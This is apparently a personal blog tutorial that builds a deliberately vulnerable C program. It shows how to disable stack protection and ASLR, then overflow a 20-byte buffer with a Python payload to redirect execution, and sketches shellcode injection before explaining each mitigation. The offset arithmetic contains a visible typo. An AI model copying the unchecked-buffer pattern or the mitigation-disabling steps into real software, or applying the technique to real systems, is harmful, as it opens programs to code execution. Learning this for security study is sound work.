---
layout: post
title: "Buffer Overflow"
date: 2022-02-16 17:00:00 +01:00
tags: edb security
---

I remember I've tried hard when I was younger to create a super easy example of a buffer overflow.
I read about it and understood the mechanism, but never accomplished writing a real program which demonstrates the effect.

That thought crossed my mind today and I realized I should be able to do it today with a little more experience.

In addition, I found this wonderful article about it:  
[dhavalkapil.com](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)

So, I will basically repeat the steps in the article and build my first own buffer overflow program.

# The program

*buffer-overflow.c*

```c
#include <stdio.h>

void secretFunction()
{
    printf("Congratulations!\n");
    printf("You have entered in the secret function!\n");
}

void echo()
{
    char buffer[20];

    printf("Enter some text:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);    
}

int main()
{
    echo();

    return 0;
}
```

As you can see, the buffer size remains unchecked and a user can enter more than the expected 20 characters.
This leads to write into parts of the memory the program is not supposed to write.

We will overwrite the RETURN address of the function, which is stored in the stack, in order to execute the secretFunction().

# Compilation

We need to set special compiler flags to disable any security checks.
It is great the compilers today have that built-in checks, but disabling them makes it easier to grasp the concepts
and maybe understand why those checks have been added over time.

```
gcc -m32 -fno-stack-protector -no-pie -zexecstack buffer-overflow.c -o buffer-overflow
```

Run this to disable ASLR (see below):

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

I've used gcc 11.1.0 in this example.

# Running and crashing the program

This works fine:

```
$ ./buffer-overflow 
Enter some text:
Test
You entered: Test
```

A text more than 20 characters crashes the program, as expected:

```
$ ./buffer-overflow
Enter some text:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
fish: Job 1, './buffer-overflow' terminated by signal SIGSEGV (Adressbereichsfehler)
```

Note: It still manages to output the text, before crashing.

# Evan's Debugger

I used to play hundreds of hours with OllyDbg, a debugger for Windows.

During my research and having `gdb` in mind I thought there might be something similar to OllyDbg for Linux.
And indeed there is: [https://github.com/eteran/edb-debugger](https://github.com/eteran/edb-debugger)

I've installed it from [here](https://aur.archlinux.org/packages/edb-debugger), but I needed to change
the plugin directory manually after the installation (Preferences -> Directories -> Plugin Directory: `/usr/lib/edb`).

![]({{ site.baseurl }}/images/2022-02-16-buffer-overflow/edb.png)

Also, you might want to install [yasm](https://archlinux.org/packages/extra/x86_64/yasm/) to generate some shell code.

# Finding the right address

We don't just want to crash our program, we want to execute the secretFunction().
In order to do that, we need to know it's address.

We can either do it in edb (CTRL+ALT+S):

![]({{ site.baseurl }}/images/2022-02-16-buffer-overflow/edb-symbols.png)

or via gdb:

```
$ gdb -batch -ex "info functions" -ex quit ./buffer-overflow
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  puts@plt
0x08049060  __libc_start_main@plt
0x08049070  __isoc99_scanf@plt
0x08049080  _start
0x080490c0  _dl_relocate_static_pie
0x080490d0  __x86.get_pc_thunk.bx
0x080490e0  deregister_tm_clones
0x08049120  register_tm_clones
0x08049160  __do_global_dtors_aux
0x08049190  frame_dummy
0x08049196  secretFunction
0x080491d2  echo
0x08049228  main
0x08049244  __x86.get_pc_thunk.ax
0x08049250  __libc_csu_init
0x080492c0  __libc_csu_fini
0x080492c5  __x86.get_pc_thunk.bp
0x080492cc  _fini
```

# The payload

Now, we need to know where exactly to put the address in our input text.
See the screenshot for details:

![]({{ site.baseurl }}/images/2022-02-16-buffer-overflow/edb-stack.png)

Our variable `buffer` starts at `ffff:ce1c` (marked in blue) in this case.
The return address to the main function is stored at `ffff:ce3c` (marked in green).

If we manage to write the address of our secret function (`0x08049196`) into the return address value, our secret function will be called, instead of returning to the main function.
Note: I suppose to work on a little-endian machine. If you work on a big-endian machine, you need to change the byte order of DWORDs and WORDs.

`0xce3c - 0xce3c = 0x20`, which is 32 in decimal.
We need to write 32 bytes (any bytes) followed by 0x08049196 into the `buffer` variable, and we should reach our goal:
(See [here](https://stackoverflow.com/questions/66258454/printing-non-ascii-characters-in-python3) why we can't use print())

```
$ python -c 'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x96\x91\x04\x08")' | ./buffer-overflow 
Enter some text:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
Congratulations!
You have entered in the secret function!
fish: Process 17504, './buffer-overflow' from job 1, 'python -c 'import sys; sys.stdo…' terminated by signal SIGSEGV (Adressbereichsfehler)
```

Voilà. Now, the program still crashes, but our secret function was called before!

Next challenge could be to build a payload which contains and executes own code,
instead of executing code which already exists in the binary.

# Executing own code

If we replace the RETURN address with the beginning of the buffer variable `ffff:ce1c`,
the input we entered will be treated as binary instructions and is executed:

```
python -c 'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x1c\xce\xff\xff")' | ./buffer-overflow
```

This fails with *SIGILL, Illegal instruction*. This is expected, as our *aaaaaa..* test string is not valid
machine code.

To generate it, we can use `yasm` for example.

# Creating the code payload

```
yasm --arch=x86 --machine=x86 --objfile=payload.bin payload.asm
```

For disassembly, I found `objdump` useful:

```
objdump --disassemble-all --disassembler-options=intel,i386 --target=binary --architecture i386 payload.bin
```

The EBP got overwritten by the too long input.
It was stored on the stack, and the leave instruction tried to restore it.
In order to not crash the program, we need to restore it.
That is what `MOV EBP, 0xffffce48` does.

`JMP 0x0804923d` returns to the original main function.

# Security

- Position-independent Code  
  PIE is not a security feature, but a requirement for Address Space Layout Randomization.
  In Windows' .exe files, the information is stored in the `.reloc` table referenced in the optional headers.
  In our example, we explicitly generated **no** PIE information via `-no-pie`.
- Address Space Layout Randomization  
  ASLR moves our program and the stack to random addresses.
  The program can only be moved if PIE is provided.
  The stack can be in a random address even if no PIE is provided.
  In our example, we explicitly disabled ASLR via `/proc/sys/kernel/randomize_va_space`.
  When disabled, our program and the stack are always in the same memory address on each run.
  This way, we can use hard-coded absolute addresses as the return address and as part of the payload,
  which makes our life a lot easier.
- Non-Executable Stack  
  Each memory area is flagged as readable, writable, executable, or a combination of them.
  So when the stack is marked as non-executable (gcc's default), then you will see an error when the RETURN to a stack address is reached.
  In our example, we explicitly marked the stack as executable via `-zexecstack`.
- Stack Protection  
  > Emit extra code to check for buffer overflows, such as stack smashing attacks. This is done by adding a guard variable to functions with vulnerable objects. This includes functions that call "alloca", and functions with buffers larger than 8 bytes. The guards are initialized when a function is entered and then checked when the function exits. If a guard check fails, an error message is printed and the program exits.

  In our example, we explicitly disabled stack protection via `-fno-stack-protector`.

In the real-world we would need to bypass all of those security measures.
